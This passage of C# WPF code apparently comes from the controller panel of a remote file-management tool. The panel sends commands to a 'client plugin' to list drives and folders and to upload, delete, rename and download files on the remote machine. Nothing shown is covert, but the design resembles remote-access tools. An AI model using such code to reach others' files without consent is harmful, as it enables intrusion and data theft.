                Margin = new Thickness(0, 0, 0, 8)
            });

            var inputBox = new TextBox
            {
                Text = defaultValue,
                Background = BgDark,
                Foreground = FgDefault,
                Padding = new Thickness(6, 4, 6, 4),
                BorderBrush = BorderBrushVal,
                CaretBrush = FgDefault,
                Style = null
            };
            panel.Children.Add(inputBox);

            var buttonPanel = new StackPanel
            {
                Orientation = Orientation.Horizontal,
                HorizontalAlignment = HorizontalAlignment.Right,
                Margin = new Thickness(0, 12, 0, 0)
            };

            var okButton = MakeThemedButton("OK", AccentBlue, AccentBlueHover, AccentBluePressed);
            okButton.Width = 80;
            okButton.Click += (s, e) => { dialog.DialogResult = true; dialog.Close(); };

            var cancelButton = MakeThemedButton("Cancel", ButtonBg, ButtonBgHover, ButtonBgPressed);
            cancelButton.Width = 80;
            cancelButton.Click += (s, e) => { dialog.DialogResult = false; dialog.Close(); };

            buttonPanel.Children.Add(okButton);
            buttonPanel.Children.Add(cancelButton);
            panel.Children.Add(buttonPanel);

            dialog.Content = panel;
            inputBox.SelectAll();
            inputBox.Focus();

            inputBox.KeyDown += (s, e) =>
            {
                if (e.Key == Key.Enter) { dialog.DialogResult = true; dialog.Close(); }
                if (e.Key == Key.Escape) { dialog.DialogResult = false; dialog.Close(); }
            };

            return dialog.ShowDialog() == true ? inputBox.Text : null;
        }

        // ==================== SEND COMMANDS ====================

        private async void SendListDir(string path)
        {
            SetStatus($"Loading: {path}...");
            byte[] pathBytes = Encoding.UTF8.GetBytes(path);
            byte[] msg = new byte[pathBytes.Length + 1];
            msg[0] = 0x01;
            Buffer.BlockCopy(pathBytes, 0, msg, 1, pathBytes.Length);
            await _context.SendToClient(msg);
        }

        private async void RequestDrives()
        {
            SetStatus("Loading drives...");
            await _context.SendToClient(new byte[] { 0x02 });
        }

        // ==================== HANDLE RESPONSES ====================

        public void HandleServerData(byte[] data)
        {
            if (data == null || data.Length == 0) return;

            byte responseType = data[0];

            // Handle ready signal from client plugin
            if (responseType == 0xFE)
            {
                Dispatcher.Invoke(() =>
                {
                    _clientReady = true;
                    SetStatus("Client plugin ready.");
                    if (_pendingDrivesRequest)
                    {
                        _pendingDrivesRequest = false;
                        RequestDrives();
                    }
                });
                return;
            }

            byte[] payload = new byte[data.Length - 1];
            if (payload.Length > 0)
                Buffer.BlockCopy(data, 1, payload, 0, payload.Length);

            Dispatcher.Invoke(() =>
            {
                switch (responseType)
                {
                    case 0x01:
                        HandleDirListing(Encoding.UTF8.GetString(payload));
                        break;

                    case 0x02:
                        HandleDriveListing(Encoding.UTF8.GetString(payload));
                        break;

                    case 0x04:
                        string uploadedPath = Encoding.UTF8.GetString(payload);
                        SetStatus($"Upload complete: {uploadedPath}");
                        RefreshCurrent();
                        break;

                    case 0x05:
                        string deleteResult = Encoding.UTF8.GetString(payload);
                        SetStatus($"Deleted: {deleteResult}");
                        RefreshCurrent();
                        break;

                    case 0x06:
                        string renameResult = Encoding.UTF8.GetString(payload);
                        SetStatus($"Renamed: {renameResult}");
                        RefreshCurrent();
                        break;

                    case 0x07:
                        string createResult = Encoding.UTF8.GetString(payload);
                        SetStatus($"Created: {createResult}");
                        RefreshCurrent();
                        break;

                    case 0x10:
                        HandleDownloadHeader(payload);
                        break;

                    case 0x11:
                        HandleDownloadChunk(payload);
                        break;

                    case 0xFF:
                        if (payload.Length > 1)
                        {
                            string errMsg = Encoding.UTF8.GetString(payload, 1, payload.Length - 1);
                            SetStatus($"Error: {errMsg}");
                        }
                        break;
                }
            });
        }

        private void HandleDirListing(string data)
        {
            _currentEntries.Clear();
            _fileListView.Items.Clear();

            string[] lines = data.Split('\n');
            if (lines.Length == 0) return;

            _currentPath = lines[0];
            _pathBox.Text = _currentPath;

            for (int i = 1; i < lines.Length; i++)
            {
                string line = lines[i];
                if (string.IsNullOrWhiteSpace(line)) continue;

                string[] parts = line.Split('|');
                if (parts.Length < 4) continue;

                var entry = new FileEntry
                {
                    IsDirectory = parts[0] == "D",
                    Name = parts[1],
                    FullPath = parts[2],
                    Size = long.TryParse(parts[3], out long s) ? s : 0,
                    Modified = parts.Length > 4 ? parts[4] : ""
                };

                _currentEntries.Add(entry);
                _fileListView.Items.Add(entry);
            }

            int dirs = _currentEntries.Count(e => e.IsDirectory && e.Name != "..");
            int files = _currentEntries.Count(e => !e.IsDirectory);
            long totalSize = _currentEntries.Where(e => !e.IsDirectory).Sum(e => e.Size);
            SetStatus($"{dirs} folder(s), {files} file(s), {FormatSize(totalSize)} total");
            UpdateButtonStates();
        }

        private void HandleDriveListing(string data)
        {
            _currentEntries.Clear();
            _fileListView.Items.Clear();
            _currentPath = "";
            _pathBox.Text = "My Computer";

            string[] lines = data.Split('\n');
            foreach (string line in lines)
            {
                if (string.IsNullOrWhiteSpace(line)) continue;

                string[] parts = line.Split('|');
                if (parts.Length < 5) continue;

                string name = parts[0];
                string label = parts[1];
                string type = parts[2];
                long total = long.TryParse(parts[3], out long t) ? t : 0;
                long free = long.TryParse(parts[4], out long f) ? f : 0;

                string displayName = string.IsNullOrEmpty(label)
                    ? $"{name} ({type})"
                    : $"{name} {label} ({type})";

                string sizeInfo = total > 0
                    ? $"{FormatSize(free)} free of {FormatSize(total)}"
                    : "";

                var entry = new FileEntry
                {
                    IsDirectory = true,
                    Name = displayName,
                    FullPath = name,
                    Size = total,
                    Modified = sizeInfo
                };

                _currentEntries.Add(entry);
                _fileListView.Items.Add(entry);
            }

            SetStatus($"{_currentEntries.Count} drive(s)");
            UpdateButtonStates();
        }

        private void HandleDownloadHeader(byte[] payload)
        {
            if (payload.Length < 3) return;

            int nameLen = payload[0] | (payload[1] << 8);
            if (payload.Length < 2 + nameLen + 12) return;

            _downloadFileName = Encoding.UTF8.GetString(payload, 2, nameLen);
            int off = 2 + nameLen;
            _downloadFileSize = BitConverter.ToInt64(payload, off);
            off += 8;
            _downloadTotalChunks = BitConverter.ToInt32(payload, off);

            _downloadChunks.Clear();
            SetStatus($"Downloading: {_downloadFileName} ({FormatSize(_downloadFileSize)}) — 0/{_downloadTotalChunks} chunks");
        }

        private void HandleDownloadChunk(byte[] payload)
        {
            if (payload.Length < 4) return;

            int chunkIndex = BitConverter.ToInt32(payload, 0);
            byte[] chunkData = new byte[payload.Length - 4];
            Buffer.BlockCopy(payload, 4, chunkData, 0, chunkData.Length);

            _downloadChunks[chunkIndex] = chunkData;

            SetStatus($"Downloading: {_downloadFileName} — {_downloadChunks.Count}/{_downloadTotalChunks} chunks");

            if (_downloadChunks.Count >= _downloadTotalChunks)
            {
                SaveDownloadedFile();
            }
        }

        private void SaveDownloadedFile()
        {
            try
            {
                var dlg = new Microsoft.Win32.SaveFileDialog
                {
                    Title = "Save downloaded file",
                    FileName = _downloadFileName,
                    Filter = "All files (*.*)|*.*"
                };

                if (dlg.ShowDialog() != true) return;

                using (var fs = new FileStream(dlg.FileName, FileMode.Create, FileAccess.Write))
                {
                    for (int i = 0; i < _downloadTotalChunks; i++)
                    {
                        if (_downloadChunks.TryGetValue(i, out byte[] chunk))
                        {
                            fs.Write(chunk, 0, chunk.Length);
                        }
                    }
                }

                SetStatus($"Saved: {dlg.FileName} ({FormatSize(_downloadFileSize)})");
            }
            catch (Exception ex)
            {
                SetStatus($"Save error: {ex.Message}");
            }
            finally
            {
                _downloadChunks.Clear();
            }
        }

        private static string FormatSize(long bytes)
        {
            if (bytes < 1024) return $"{bytes} B";
            if (bytes < 1024 * 1024) return $"{bytes / 1024.0:F1} KB";
            if (bytes < 1024L * 1024 * 1024) return $"{bytes / (1024.0 * 1024):F1} MB";
            return $"{bytes / (1024.0 * 1024 * 1024):F2} GB";
        }

        public void Dispose() { }
    }
}